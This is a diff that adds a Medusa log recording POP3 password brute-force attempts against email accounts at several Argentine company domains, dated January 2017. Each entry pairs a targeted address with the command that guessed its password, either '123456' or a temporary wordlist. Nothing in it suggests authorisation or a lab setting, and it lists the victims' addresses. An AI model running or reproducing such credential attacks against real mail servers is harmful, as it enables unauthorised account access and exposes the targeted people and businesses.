@@ -1,0 +1,27 @@
+luis@indumentarialider.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:15:55)
+# medusa -h indumentarialider.com.ar -u luis@indumentarialider.com.ar -p 123456 -O medusa.log -M pop3 -b 
+contaduria@systrade.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:16:15)
+# medusa -h systrade.com.ar -u contaduria@systrade.com.ar -p 123456 -O medusa.log -M pop3 -b 
+# Medusa has finished (2017-01-31 21:16:29).
+contaduria@texglobe.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:16:29)
+# medusa -h texglobe.com.ar -u contaduria@texglobe.com.ar -p 123456 -O medusa.log -M pop3 -b 
+# Medusa has finished (2017-01-31 21:16:44).
+mantenimiento@mandarsalud.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:16:44)
+# medusa -h mandarsalud.com.ar -u mantenimiento@mandarsalud.com.ar -p 123456 -O medusa.log -M pop3 -b 
+julio@enapan.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:18:30)
+# medusa -h enapan.com.ar -u julio@enapan.com.ar -p 123456 -O medusa.log -M pop3 -b 
+clientes@polizul.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:19:44)
+# medusa -h polizul.com.ar -u clientes@polizul.com.ar -P /tmp/tmp.w6MxaNWhtw -O medusa.log -M pop3 -b 
+pedro@cenedvignales.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:20:03)
+# medusa -h cenedvignales.com.ar -u pedro@cenedvignales.com.ar -P /tmp/tmp.a9vqDwg9oa -O medusa.log -M pop3 -b 
+# Medusa has finished (2017-01-31 21:20:50).
+logistica@barriolapedrera.com.ar
+# Medusa v.2.2_rc3 (2017-01-31 21:20:50)
+# medusa -h barriolapedrera.com.ar -u logistica@barriolapedrera.com.ar -P /tmp/tmp.HjvtE8fBI3 -O medusa.log -M pop3 -b 
